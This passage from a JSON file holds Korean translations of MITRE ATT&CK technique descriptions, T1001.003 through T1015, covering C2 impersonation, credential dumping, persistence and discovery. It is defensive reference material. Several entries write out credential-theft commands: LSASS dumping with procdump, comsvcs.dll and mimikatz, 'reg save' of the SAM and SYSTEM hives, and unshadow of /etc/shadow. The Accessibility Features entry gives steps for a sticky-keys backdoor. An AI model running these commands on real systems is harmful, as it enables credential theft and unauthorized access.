      "description": "적대자는 명령 및 제어 활동을 숨기고 분석 노력을 저지하기 위해 합법적인 프로토콜이나 웹 서비스 트래픽을 위장할 수 있습니다. 합법적인 프로토콜이나 웹 서비스를 위장함으로써, 적대자는 그들의 명령 및 제어 트래픽을 합법적인 네트워크 트래픽과 혼합되도록 만들 수 있습니다.\n\n적대자는 또한 가짜 SSL/TLS 핸드셰이크를 위장하여 이후의 트래픽이 SSL/TLS로 암호화된 것처럼 보이게 할 수 있으며, 이는 일부 보안 도구에 간섭을 줄 수 있거나 트래픽이 신뢰할 수 있는 엔티티와 관련이 있는 것처럼 보이게 할 수 있습니다.\n\n또한 적대자는 합법적인 프로토콜을 활용하여 예상되는 웹 트래픽이나 신뢰할 수 있는 서비스를 위장할 수 있습니다. 예를 들어, 적대자는 HTTP 헤더, URI 엔드포인트, SSL 인증서 및 전송 데이터를 조작하여 C2 통신을 위장하거나 Gmail, Google Drive 및 Yahoo Messenger와 같은 합법적인 서비스를 모방할 수 있습니다. (출처: ESET Okrum 2019년 7월) (출처: Malleable-C2-U42)",
      "external_id": "T1001.003",
      "modified": "2024-10-09T15:40:19.436Z",
      "title": "Protocol or Service Impersonation",
      "translated": true
    },
    {
      "description": "공격자는 데이터 유출 이전에 수집된 데이터를(예: 민감한 문서) 압축하여 이동성을 높이고 네트워크를 통해 전송되는 데이터 양을 최소화할 수 있습니다. 압축 과정은 유출 채널과 별도로 수행되며, 맞춤형 프로그램이나 알고리즘, 또는 7zip, RAR, ZIP, zlib와 같은 일반적인 압축 라이브러리 또는 유틸리티를 사용하여 진행됩니다.",
      "external_id": "T1002",
      "modified": "2020-03-30T03:09:45.384Z",
      "title": "Data Compressed",
      "translated": true
    },
    {
      "description": "적대자는 계정 로그인 및 자격 증명 자료를 얻기 위해 자격 증명을 덤프하려고 할 수 있으며, 이는 일반적으로 해시 또는 평문 비밀번호 형태로 이루어집니다. 자격 증명은 운영 체제 캐시, 메모리 또는 구조체에서 획득할 수 있습니다.(인용: Unix에서 MimiKatz 사용하기) 그런 다음 자격 증명은 [측면 이동(Lateral Movement)](https://attack.mitre.org/tactics/TA0008)를 수행하고 제한된 정보에 접근하는 데 사용될 수 있습니다.\n\n연관된 하위 기법에서 언급된 여러 도구는 적대자와 전문 보안 테스트 모두에서 사용될 수 있습니다. 추가적으로 커스텀 도구도 존재할 가능성이 있습니다.",
      "external_id": "T1003",
      "modified": "2024-10-15T15:12:43.034Z",
      "title": "OS Credential Dumping",
      "translated": true
    },
    {
      "description": "공격자는 로컬 보안 권한 하위 시스템 서비스(LSASS)의 프로세스 메모리에 저장된 자격 증명 자료에 접근하려고 시도할 수 있습니다. 사용자가 로그인하면 시스템은 다양한 자격 증명 자료를 생성하고 LSASS 프로세스 메모리에 저장합니다. 이러한 자격 증명 자료는 관리 사용자 또는 SYSTEM에 의해 수집되어 [수평 이동](https://attack.mitre.org/tactics/TA0008)을 수행하는 데 사용될 수 있습니다. [대체 인증 자료 사용](https://attack.mitre.org/techniques/T1550) 방식으로 말이죠.\n\n메모리 내 기법 외에도, LSASS 프로세스 메모리는 타겟 호스트에서 덤프되어 로컬 시스템에서 분석될 수 있습니다.\n\n예를 들어, 타겟 호스트에서 procdump를 사용하여 다음과 같이 할 수 있습니다:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\n로컬에서는 mimikatz를 사용하여 다음과 같이 실행할 수 있습니다:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n`comsvcs.dll`과 같은 Windows 내장 도구도 사용될 수 있습니다:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full</code>(인용: Volexity Exchange Marauder 2021년 3월)(인용: Symantec 정부 부문에 대한 공격)\n\n[이미지 파일 실행 옵션 주입](https://attack.mitre.org/techniques/T1546/012)과 유사하게, Windows 오류 보고서(`WerFault.exe`)를 통해 `lsass.exe`의 메모리 덤프를 생성하는 조용한 프로세스 종료 메커니즘이 남용될 수 있습니다.(인용: Deep Instinct LSASS)\n\nWindows 보안 지원 공급자(SSP) DLL은 시스템 시작 시 LSASS 프로세스에 로드됩니다. LSA에 로드된 이후에는 SSP DLL이 Windows에 저장된 암호화된 및 일반 암호에 접근할 수 있습니다. 여기에는 로그인한 사용자의 도메인 비밀번호 또는 스마트 카드 PIN이 포함됩니다. SSP 구성은 두 개의 레지스트리 키에 저장됩니다: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> 및 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. 공격자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이는 시스템이 다음 번 부팅할 때 또는 AddSecurityPackage Windows API 함수가 호출될 때 로드됩니다.(인용: Graeber 2014)\n\n다음 SSP를 사용하여 자격 증명에 접근할 수 있습니다:\n\n* Msv: 인터랙티브 로그온, 배치 로그온 및 서비스 로그온은 MSV 인증 패키지를 통해 수행됩니다.\n* Wdigest: 다이제스트 인증 프로토콜은 하이퍼텍스트 전송 프로토콜(HTTP) 및 단순 인증 보안 계층(SASL) 교환과 함께 사용하도록 설계되었습니다.(인용: TechNet 블로그 자격 증명 보호)\n* Kerberos: Windows 2000 이후의 클라이언트-서버 도메인 상호 인증에 선호됩니다.\n* CredSSP: 원격 데스크톱 서비스에 대해 SSO 및 네트워크 수준 인증을 제공합니다.(인용: TechNet 블로그 자격 증명 보호)",
      "external_id": "T1003.001",
      "modified": "2024-08-13T13:52:45.379Z",
      "title": "LSASS Memory",
      "translated": true
    },
    {
      "description": "적대적 행위자는 메모리 내 기법이나 SAM 데이터베이스가 저장된 Windows 레지스트리를 통해 보안 계정 관리자(SAM) 데이터베이스에서 자격 증명 자료를 추출하려고 할 수 있습니다. SAM은 호스트의 로컬 계정을 포함하는 데이터베이스 파일로, 일반적으로 <code>net user</code> 명령어를 통해 확인할 수 있는 계정입니다. SAM 데이터베이스를 열거하려면 SYSTEM 수준의 액세스가 필요합니다.\n\n메모리 내 기법을 통해 SAM 파일을 검색하는 데 사용할 수 있는 여러 도구가 있습니다:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\n또는, Reg를 사용하여 레지스트리에서 SAM을 추출할 수 있습니다:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\n그 다음 Creddump7를 사용하여 로컬에서 SAM 데이터베이스를 처리하고 해시를 추출할 수 있습니다. (출처: GitHub Creddump7)\n\n추가 사항:\n\n* RID 500 계정은 로컬 내장 관리자입니다.\n* RID 501은 게스트 계정입니다.\n* 사용자 계정은 RID가 1,000 이상으로 시작합니다.",
      "external_id": "T1003.002",
      "modified": "2024-10-15T16:40:52.174Z",
      "title": "Security Account Manager",
      "translated": true
    },
    {
      "description": "공격자는 자격 증명 정보를 훔치고, 장치, 사용자 및 접근 권한과 같은 도메인 구성원에 대한 다른 정보를 얻기 위해 Active Directory 도메인 데이터베이스에 접근하거나 이를 복사하려고 할 수 있습니다. 기본적으로 NTDS 파일(NTDS.dit)은 도메인 컨트롤러의 <code>%SystemRoot%\\NTDS\\Ntds.dit</code>에 위치해 있습니다. (출처: 위키백과 Active Directory)\n\n공격자는 활성 도메인 컨트롤러에서 NTDS 파일을 찾는 것 외에도 동일하거나 유사한 정보를 포함하고 있는 백업을 검색할 수 있습니다. (출처: Metcalf 2015)\n\n다음 도구 및 기법을 사용하여 NTDS 파일과 전체 Active Directory 해시의 내용을 열거할 수 있습니다.\n\n* 볼륨 섀도 복사 (Volume Shadow Copy)\n* secretsdump.py\n* 내장 Windows 도구인 ntdsutil.exe 사용\n* Invoke-NinjaCopy",
      "external_id": "T1003.003",
      "modified": "2023-07-28T14:41:38.908Z",
      "title": "NTDS",
      "translated": true
    },
    {
      "description": "SYSTEM 접근 권한을 가진 공격자는 로컬 보안 기관(LSA) 비밀에 접근하려 할 수 있으며, 여기에는 서비스 계정에 대한 자격 증명과 같은 다양한 자격 증명 자료가 포함될 수 있습니다.(인용: Passcape LSA Secrets)(인용: Microsoft AD Admin Tier Model)(인용: Tilbury Windows Credentials) LSA 비밀은 레지스트리의 <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>에 저장됩니다. 또한 LSA 비밀은 메모리에서 덤프할 수도 있습니다.(인용: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075)는 레지스트리에서 정보를 추출하는 데 사용할 수 있습니다. [Mimikatz](https://attack.mitre.org/software/S0002)는 메모리에서 비밀을 추출하는 데 사용할 수 있습니다.(인용: ired Dumping LSA Secrets)",
      "external_id": "T1003.004",
      "modified": "2024-08-13T15:49:17.591Z",
      "title": "LSA Secrets",
      "translated": true
    },
    {
      "description": "공격자는 도메인 컨트롤러에 접근할 수 없는 경우 인증을 수행하기 위해 사용되는 캐시된 도메인 자격 증명에 접근을 시도할 수 있습니다. (출처: Microsoft - Cached Creds)\n\nWindows Vista 및 그 이후 버전에서는 해시 형식이 DCC2 (Domain Cached Credentials version 2) 해시로, MS-Cache v2 해시로도 알려져 있습니다. (출처: PassLib mscache) 기본 캐시된 자격 증명의 수는 시스템마다 다르며 변경할 수 있습니다. 이 해시는 패스 더 해시 방식의 공격을 허용하지 않으며, 대신 평문 비밀번호를 복구하기 위해 [비밀번호 크래킹](https://attack.mitre.org/techniques/T1110/002)이 필요합니다. (출처: ired mscache)\n\nLinux 시스템에서는 Active Directory 자격 증명에 대해 System Security Services Daemon (SSSD) 또는 Quest Authentication Services(이전의 VAS)와 같은 소프트웨어가 유지하는 캐시를 통해 접근할 수 있습니다. 캐시된 자격 증명 해시는 일반적으로 SSSD의 경우 `/var/lib/sss/db/cache.[domain].ldb`에, Quest의 경우 `/var/opt/quest/vas/authcache/vas_auth.vdb`에 위치합니다. 공격자는 이러한 데이터베이스 파일에서 `tdbdump`와 같은 유틸리티를 사용하여 캐시된 해시를 덤프하고 [비밀번호 크래킹](https://attack.mitre.org/techniques/T1110/002)을 통해 평문 비밀번호를 얻을 수 있습니다. (출처: Brining MimiKatz to Unix)\n\nSYSTEM 또는 sudo 접근 권한으로, [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075)와 같은 도구/유틸리티 및 Windows용 secretsdump.py 또는 Linux용 Linikatz를 사용하여 캐시된 자격 증명을 추출할 수 있습니다. (출처: Brining MimiKatz to Unix)\n\n참고: Windows Vista의 캐시된 자격 증명은 PBKDF2를 사용하여 유도됩니다. (출처: PassLib mscache)",
      "external_id": "T1003.005",
      "modified": "2024-10-15T14:18:59.123Z",
      "title": "Cached Domain Credentials",
      "translated": true
    },
    {
      "description": "적대자는 Windows 도메인 컨트롤러의 응용 프로그래밍 인터페이스(API)를 악용하여 자격 증명 및 기타 민감한 정보에 접근하려고 할 수 있습니다. 이를 위해 DCSync라는 기법을 사용하여 원격 도메인 컨트롤러에서 복제 프로세스를 시뮬레이션합니다 (인용: Microsoft DRSR Dec 2017) (인용: Microsoft GetNCCChanges) (인용: Samba DRSUAPI) (인용: Wine API samlib.dll).\n\n도메인 컨트롤러의 Administrators, Domain Admins 및 Enterprise Admin 그룹의 구성원이나 컴퓨터 계정은 DCSync를 실행하여 Active Directory에서 비밀번호 데이터를 가져올 수 있습니다 (인용: ADSecurity Mimikatz DCSync). 여기에는 KRBTGT 및 Administrators와 같은 유용할 수 있는 계정의 현재 및 과거 해시가 포함될 수 있습니다. 이러한 해시는 이후 [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)를 생성하는 데 사용되거나 [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)에서 활용될 수 있으며 (인용: Harmj0y Mimikatz 및 DCSync), [Account Manipulation](https://attack.mitre.org/techniques/T1098)에서 언급된 바와 같이 계정의 비밀번호를 변경하는 데도 사용할 수 있습니다 (인용: InsiderThreat ChangeNTLM July 2017).\n\nDCSync 기능은 [Mimikatz](https://attack.mitre.org/software/S0002)에서 \"lsadump\" 모듈에 포함되어 있습니다 (인용: GitHub Mimikatz lsadump Module). Lsadump는 또한 레거시 복제 프로토콜을 통해 DCSync를 수행하는 NetSync를 포함하고 있습니다 (인용: Microsoft NRPC Dec 2017).",
      "external_id": "T1003.006",
      "modified": "2024-10-15T15:54:08.312Z",
      "title": "DCSync",
      "translated": true
    },
    {
      "description": "공격자는 proc 파일 시스템 또는 `/proc`에서 자격 증명을 수집할 수 있습니다. proc 파일 시스템은 Linux 기반 시스템에서 가상 메모리를 관리하기 위한 커널 데이터 구조와의 인터페이스로 사용되는 의사 파일 시스템입니다. 각 프로세스에 대해 `/proc/<PID>/maps` 파일은 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지를 보여줍니다. 또한 디버깅 목적으로 노출된 `/proc/<PID>/mem` 파일은 프로세스의 가상 주소 공간에 접근할 수 있게 해줍니다.(출처: Picus Labs Proc cump 2022)(출처: baeldung Linux proc map 2022)\n\n루트 권한으로 실행하는 경우, 공격자는 시스템의 모든 프로세스에 대해 자격 증명을 나타내는 패턴이 포함된 메모리 위치를 검색할 수 있습니다. 공격자는 정규 표현식 패턴을 사용하여 메모리 구조나 캐시된 해시 내에서 고정 문자열을 찾기 위해 <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>와 같은 명령을 사용할 수 있습니다.(출처: atomic-red proc file system) 권한이 없는 상태에서 실행할 경우, 프로세스는 여전히 자신의 가상 메모리 위치를 볼 수 있습니다. 일부 서비스나 프로그램은 프로세스의 메모리 내에 평문으로 자격 증명을 저장할 수 있습니다.(출처: MimiPenguin GitHub 2017년 5월)(출처: Polop Linux PrivEsc Gitbook)\n\n웹 브라우저의 권한으로 실행하거나 브라우저 권한이 포함된 프로세스는 `/maps` 및 `/mem` 위치에서 해시 또는 평문 자격 증명이 위치할 수 있는 일반 웹사이트 자격 증명 패턴을 검색할 수 있습니다(이는 동일한 구조 내에서 인접한 메모리를 찾는 데에도 사용될 수 있습니다).",
      "external_id": "T1003.007",
      "modified": "2024-10-15T15:13:32.253Z",
      "title": "Proc Filesystem",
      "translated": true
    },
    {
      "description": "적대자는 오프라인 비밀번호 크래킹을 가능하게 하기 위해 <code>/etc/passwd</code>와 <code>/etc/shadow</code>의 내용을 덤프하려고 할 수 있습니다. 대부분의 최신 리눅스 운영 체제는 사용자의 계정 정보를 저장하기 위해 <code>/etc/passwd</code>와 <code>/etc/shadow</code>의 조합을 사용하며, 비밀번호 해시는 <code>/etc/shadow</code>에 저장됩니다. 기본적으로 <code>/etc/shadow</code>는 루트 사용자만 읽을 수 있습니다. (출처: Linux Password and Shadow File Formats)\n\n리눅스 유틸리티인 unshadow는 비밀번호 크래킹 유틸리티인 John the Ripper와 같은 형식에 맞춰 두 파일을 결합하는 데 사용할 수 있습니다. (출처: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>",
      "external_id": "T1003.008",
      "modified": "2024-09-25T20:48:04.491Z",
      "title": "/etc/passwd and /etc/shadow",
      "translated": true
    },
    {
      "description": "Winlogon.exe는 로그인/로그오프 시의 작업과 Ctrl-Alt-Delete로 트리거되는 보안 주의 시퀀스(SAS)를 담당하는 Windows 구성 요소입니다. <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 및 <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>의 레지스트리 항목은 Winlogon을 지원하는 추가 도우미 프로그램 및 기능을 관리하는 데 사용됩니다. (출처: Cylance Reg Persistence 2013년 9월)\n\n이 레지스트리 키에 대한 악의적인 수정은 Winlogon이 악성 DLL 및/또는 실행 파일을 로드하고 실행하도록 할 수 있습니다. 특히, 다음의 하위 키는 남용될 가능성이 있는 것으로 알려져 있습니다: (출처: Cylance Reg Persistence 2013년 9월)\n\n* Winlogon\\Notify - Winlogon 이벤트를 처리하는 알림 패키지 DLL을 가리킵니다.\n* Winlogon\\Userinit - 사용자가 로그인할 때 실행되는 사용자 초기화 프로그램인 userinit.exe를 가리킵니다.\n* Winlogon\\Shell - 사용자가 로그인할 때 실행되는 시스템 쉘인 explorer.exe를 가리킵니다.\n\n상대방은 이러한 기능을 이용하여 악성 코드를 반복적으로 실행하고 지속성을 확립할 수 있습니다.",
      "external_id": "T1004",
      "modified": "2020-01-24T17:07:19.762Z",
      "title": "Winlogon Helper DLL",
      "translated": true
    },
    {
      "description": "적대 세력은 정보 유출(Exfiltration) 이전에 파일 시스템, 구성 파일 또는 로컬 데이터베이스와 같은 로컬 시스템 소스를 검색하여 관심 있는 파일 및 민감한 데이터를 찾을 수 있습니다.\n\n이들은 파일 시스템과 상호작용하여 정보를 수집할 수 있는 [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059), 예를 들어 [cmd](https://attack.mitre.org/software/S0106) 및 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 사용하여 이를 수행할 수 있습니다. 적대 세력은 또한 로컬 시스템에서 [자동화된 수집](https://attack.mitre.org/techniques/T1119) 기능을 사용할 수 있습니다.",
      "external_id": "T1005",
      "modified": "2023-04-12T23:54:39.466Z",
      "title": "Data from Local System",
      "translated": true
    },
    {
      "description": "공격자는 파일 접근 제어 및 파일 시스템 모니터링을 우회하기 위해 직접 볼륨에 접근할 수 있습니다. Windows는 프로그램이 논리 볼륨에 직접 접근할 수 있도록 허용합니다. 직접 접근이 가능한 프로그램은 파일 시스템 데이터 구조를 분석하여 드라이브에서 파일을 직접 읽고 쓸 수 있습니다. 이 기술은 Windows 파일 접근 제어 및 파일 시스템 모니터링 도구를 우회할 수 있습니다. (출처: Hakobyan 2009)\n\n`NinjaCopy`와 같은 유틸리티는 PowerShell에서 이러한 작업을 수행하는 데 사용됩니다. (출처: Github PowerSploit Ninjacopy) 공격자는 또한 `vssadmin`, `wbadmin` 및 [esentutl](https://attack.mitre.org/software/S0404)과 같은 기본 제공 또는 서드파티 유틸리티를 사용하여 시스템 볼륨의 데이터에 대한 섀도 복사본이나 백업을 생성할 수 있습니다. (출처: LOLBAS Esentutl)",
      "external_id": "T1006",
      "modified": "2024-04-16T12:25:24.480Z",
      "title": "Direct Volume Access",
      "translated": true
    },
    {
      "description": "적대자는 등록된 로컬 시스템 서비스에 대한 정보를 수집하려고 할 수 있습니다. 적대자는 <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, <code>net start</code>와 같은 도구 및 운영 체제 유틸리티 명령을 사용하여 서비스에 대한 정보를 얻을 수 있습니다.\n\n적대자는 [시스템 서비스 탐지(System Service Discovery)](https://attack.mitre.org/techniques/T1007)에서 얻은 정보를 자동화된 탐지 과정에서 활용하여 후속 행동을 형성할 수 있습니다. 이에는 적대자가 대상을 완전히 감염시킬지 여부나 특정 행동을 시도할지 여부가 포함될 수 있습니다.",
      "external_id": "T1007",
      "modified": "2023-04-03T18:55:18.326Z",
      "title": "System Service Discovery",
      "translated": true
    },
    {
      "description": "위협 행위자들은 주요 통신 채널이 손상되거나 접근할 수 없을 경우, 신뢰할 수 있는 명령 및 제어를 유지하고 데이터 전송 한계를 피하기 위해 대체 통신 채널이나 백업 채널을 사용할 수 있습니다.",
      "external_id": "T1008",
      "modified": "2020-07-14T19:49:47.340Z",
      "title": "Fallback Channels",
      "translated": true
    },
    {
      "description": "적대자는 이진 패딩을 사용하여 불필요한 데이터를 추가하고 악성 코드의 디스크 상 표현을 변경할 수 있습니다. 이 과정은 이진 파일의 기능이나 동작에 영향을 주지 않으면서 진행됩니다. 이러한 방식은 종종 이진 파일의 크기를 증가시켜 일부 보안 도구가 파일 크기 제한으로 인해 처리할 수 없는 크기로 만듭니다.\n\n이진 패딩은 파일의 체크섬을 효과적으로 변경하며, 해시 기반 블랙리스트 및 정적 안티바이러스 서명을 회피하는 데에도 사용될 수 있습니다.(인용: ESET OceanLotus) 사용되는 패딩은 일반적으로 불필요한 데이터를 생성하는 함수를 통해 생성되어 악성 코드의 끝부분에 추가되거나 악성 코드의 특정 섹션에 적용됩니다.(인용: Securelist Malware Tricks April 2017) 파일 크기를 증가시키면 큰 파일을 스캔하도록 설계되거나 구성되지 않은 특정 도구 및 탐지 능력의 효과가 감소할 수 있습니다. 이로 인해 분석을 위해 수집될 가능성도 줄어들 수 있습니다. VirusTotal과 같은 공개 파일 스캔 서비스는 분석을 위한 업로드된 파일의 최대 크기를 제한합니다.(인용: VirusTotal FAQ)",
      "external_id": "T1009",
      "modified": "2020-09-17T18:25:33.796Z",
      "title": "Binary Padding",
      "translated": true
    },
    {
      "description": "적대적 행위자는 열린 응용 프로그램 창의 목록을 가져오려고 시도할 수 있습니다. 창 목록은 시스템이 어떻게 사용되는지를 나타내는 정보를 전달할 수 있습니다. (출처: Prevailion DarkWatchman 2021) 예를 들어, 응용 프로그램 창에 대한 정보는 수집할 잠재적인 데이터를 식별하는 데 사용될 수 있으며, 보안 도구([보안 소프트웨어 탐지](https://attack.mitre.org/techniques/T1518/001))를 식별하여 회피할 수 있습니다. (출처: ESET Grandoreiro April 2020)\n\n적대적 행위자는 이러한 유형의 열거를 위해 일반적으로 시스템 기능을 악용합니다. 예를 들어, 그들은 [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059) 명령 및 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수를 통해 정보를 수집할 수 있습니다.",
      "external_id": "T1010",
      "modified": "2024-10-15T16:22:56.372Z",
      "title": "Application Window Discovery",
      "translated": true
    },
    {
      "description": "적대자는 명령 및 제어 채널과는 다른 네트워크 매체를 통해 데이터를 유출하려고 시도할 수 있습니다. 명령 및 제어 네트워크가 유선 인터넷 연결인 경우, 예를 들어 WiFi 연결, 모뎀, 모바일 데이터 연결, 블루투스 또는 다른 무선 주파수(RF) 채널을 통해 유출이 발생할 수 있습니다.\n\n적대자는 충분한 접근 권한이나 근접성이 있을 경우 이 방법을 선택할 수 있으며, 이 연결은 동일한 기업 네트워크를 경유하지 않기 때문에 주요 인터넷 연결 채널만큼 보안이 잘 되지 않거나 방어가 부족할 수 있습니다.",
      "external_id": "T1011",
      "modified": "2023-09-11T16:06:10.376Z",
      "title": "Exfiltration Over Other Network Medium",
      "translated": true
    },
    {
      "description": "적대자는 명령 및 제어 채널 대신 Bluetooth를 통해 데이터를 유출하려고 시도할 수 있습니다. 명령 및 제어 네트워크가 유선 인터넷 연결인 경우, 적대자는 Bluetooth 통신 채널을 사용하여 데이터를 유출하는 것을 선택할 수 있습니다.\n\n적대자가 이러한 방법을 선택하는 것은 충분한 접근 권한과 근접성이 있을 때 이루어질 수 있습니다. Bluetooth 연결은 동일한 기업 네트워크를 통해 라우팅되지 않기 때문에 기본 인터넷 연결 채널만큼 안전하거나 방어되지 않을 수도 있습니다.",
      "external_id": "T1011.001",
      "modified": "2022-03-08T21:02:15.802Z",
      "title": "Exfiltration Over Bluetooth",
      "translated": true
    },
    {
      "description": "적대자는 시스템, 구성 및 설치된 소프트웨어에 대한 정보를 수집하기 위해 Windows 레지스트리와 상호작용할 수 있습니다.\n\n레지스트리는 운영 체제, 구성, 소프트웨어 및 보안에 대한 중요한 정보를 대량으로 포함하고 있습니다. (출처: 위키백과 Windows 레지스트리) [Reg](https://attack.mitre.org/software/S0075) 유틸리티를 사용하여 정보를 쉽게 조회할 수 있지만, 레지스트리에 접근하는 다른 방법도 존재합니다. 일부 정보는 적대자가 네트워크 내에서 자신의 작전을 진행하는 데 도움이 될 수 있습니다. 적대자는 [Query Registry](https://attack.mitre.org/techniques/T1012)에서 정보 사용하여 자동화된 탐색 중 후속 행동을 형성할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시키거나 특정 작업을 시도할지 여부가 포함됩니다.",
      "external_id": "T1012",
      "modified": "2023-04-03T18:56:37.011Z",
      "title": "Query Registry",
      "translated": true
    },
    {
      "description": "프린터 포트 모니터는 (인용: AddMonitor) API 호출을 통해 설정할 수 있으며, 이로써 시작 시 로드될 DLL을 설정할 수 있습니다. (인용: AddMonitor) 이 DLL은 <code>C:\\Windows\\System32</code>에 위치할 수 있으며, 부팅 시 프린트 스풀러 서비스인 spoolsv.exe에 의해 로드됩니다. spoolsv.exe 프로세스는 SYSTEM 수준의 권한으로 실행됩니다. (인용: Bloxham) 또는, 필요한 권한이 있을 경우, 그 DLL에 대한 완전한 경로명을 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>에 쓸 수 있다면 임의의 DLL을 로드할 수 있습니다.\n\n레지스트리 키에는 다음 항목이 포함되어 있습니다:\n\n* 로컬 포트\n* 표준 TCP/IP 포트\n* USB 모니터\n* WSD 포트\n\n공격자는 이 기술을 사용하여 시스템 부팅 시 악성 코드를 로드하게 할 수 있으며, 이는 시스템 재부팅 후에도 지속적으로 실행되고 SYSTEM 권한으로 작동하게 됩니다.",
      "external_id": "T1013",
      "modified": "2020-01-24T19:47:55.183Z",
      "title": "Port Monitors",
      "translated": true
    },
    {
      "description": "적대자들은 루트킷을 사용하여 프로그램, 파일, 네트워크 연결, 서비스, 드라이버 및 기타 시스템 구성 요소의 존재를 숨길 수 있습니다. 루트킷은 시스템 정보를 제공하는 운영 체제 API 호출을 가로채거나 후킹하고 수정함으로써 맬웨어의 존재를 숨기는 프로그램입니다. (출처: 시만텍 윈도우 루트킷)\n\n루트킷 또는 루트킷 활성화 기능은 운영 체제의 사용자 또는 커널 수준 또는 하이퍼바이저, 마스터 부트 레코드, 또는 [시스템 펌웨어](https://attack.mitre.org/techniques/T1542/001)를 포함하는 더 낮은 수준에 존재할 수 있습니다. (출처: 위키백과 루트킷) 루트킷은 윈도우, 리눅스 및 맥 OS X 시스템에서 발견된 바 있습니다. (출처: 크라우드스트라이크 리눅스 루트킷) (출처: 블랙햇 맥 OS X 루트킷)",
      "external_id": "T1014",
      "modified": "2023-03-30T21:01:50.568Z",
      "title": "Rootkit",
      "translated": true
    },
    {
      "description": "Windows에는 사용자가 로그인하기 전(예: Windows 로그인 화면에서) 키 조합으로 실행할 수 있는 접근성 기능이 포함되어 있습니다. 공격자는 이러한 프로그램이 실행되는 방식을 수정하여 시스템에 로그인하지 않고도 명령 프롬프트나 백도어를 얻을 수 있습니다.\n\n두 가지 일반적인 접근성 프로그램은 <code>C:\\Windows\\System32\\sethc.exe</code>로, 이는 Shift 키를 다섯 번 누를 때 실행되며, <code>C:\\Windows\\System32\\utilman.exe</code>로, 이는 Windows + U 키 조합을 누를 때 실행됩니다. sethc.exe 프로그램은 종종 \"스티키 키\"로 불리며, 공격자들이 원격 데스크톱 로그인 화면을 통해 인증되지 않은 접근을 위해 사용하곤 합니다. (인용: FireEye Hikit Rootkit)\n\nWindows의 버전에 따라 공격자는 코드 무결성 향상 때문에 이러한 기능을 다른 방식으로 이용할 수 있습니다. 최신 Windows 버전에서는 교체된 바이너리가 x64 시스템의 경우 디지털 서명되어야 하며, 바이너리는 <code>%systemdir%\\</code>에 있어야 하고, Windows 파일 또는 리소스 보호(WFP/WRP)로 보호되어야 합니다. (인용: DEFCON2016 Sticky Keys) 디버거 방법은 해당 접근성 기능 바이너리를 교체하지 않아도 되기 때문에 잠재적인 우회 방법으로 발견된 것으로 보입니다. 두 방법의 예시는 다음과 같습니다.\n\nWindows XP 및 이후 버전이나 Windows Server 2003/R2 및 이후 버전에서 간단한 바이너리 교체의 예로, 프로그램(예: <code>C:\\Windows\\System32\\utilman.exe</code>)을 \"cmd.exe\" (또는 백도어 접근을 제공하는 다른 프로그램)로 교체할 수 있습니다. 이후 로그인 화면에서 적절한 키 조합을 누르거나 원격 데스크톱 프로토콜([Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076))을 통해 연결된 상태에서 적절한 키 조합을 누르면 교체된 파일이 시스템(SYSTEM) 권한으로 실행됩니다. (인용: Tilbury 2014)\n\nWindows Vista 및 이후 버전이나 Windows Server 2008 및 이후 버전에서 디버거 방법의 예로, \"cmd.exe\" 또는 백도어 접근을 제공하는 다른 프로그램을 접근성 프로그램(예: \"utilman.exe\")의 \"디버거\"로 구성하는 레지스트리 키를 수정할 수 있습니다. 레지스트리가 수정된 후 로그인 화면에서 키보드 앞에 있거나 RDP로 연결된 상태에서 적절한 키 조합을 누르면 \"디버거\" 프로그램이 SYSTEM 권한으로 실행됩니다. (인용: Tilbury 2014)\n\n유사한 방식으로 활용될 수 있는 다른 접근성 기능도 존재합니다: (인용: DEFCON2016 Sticky Keys)\n\n* 화면 키보드: <code>C:\\Windows\\System32\\osk.exe</code>\n* 확대경: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* 내레이터: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* 디스플레이 전환기: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* 앱 전환기: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
      "external_id": "T1015",
      "modified": "2020-05-13T20:37:30.008Z",
      "title": "Accessibility Features",
      "translated": true
    },
    {
